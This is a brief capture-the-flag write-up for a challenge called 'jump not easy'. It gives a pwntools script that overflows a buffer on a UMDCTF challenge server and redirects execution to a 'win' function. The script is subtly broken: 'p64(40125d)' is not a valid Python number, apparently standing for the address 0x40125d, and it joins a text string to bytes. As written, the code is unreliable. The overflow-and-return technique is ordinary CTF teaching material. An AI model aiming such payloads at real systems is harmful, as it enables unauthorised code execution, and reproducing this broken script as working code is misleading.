## jump not easy

basic overflow + jump to win function

```python

from pwn import *

p = remote("chals5.umdctf.io", 7003)
payload = "A" * 72
payload += p64(40125d)
 
p.sendline(payload)
p.interactive()
```
